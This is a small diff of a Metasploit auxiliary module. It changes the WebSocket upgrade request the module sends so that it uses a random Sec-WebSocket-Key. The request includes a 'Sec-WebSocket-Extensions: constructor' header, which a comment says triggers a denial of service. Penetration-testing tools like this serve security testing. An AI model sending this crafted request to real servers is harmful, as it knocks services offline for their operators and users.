@@ -40,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
     req = [
       "GET #{path} HTTP/1.1",
       "Connection: Upgrade",
-      "Sec-WebSocket-Key: test",
+      "Sec-WebSocket-Key: #{Rex::Text.rand_text_alpha(rand(10) + 5).to_s}",
       "Sec-WebSocket-Version: 8",
       "Sec-WebSocket-Extensions: constructor",  #Adding "constructor" as the value for this header causes the DoS
       "Upgrade: websocket",
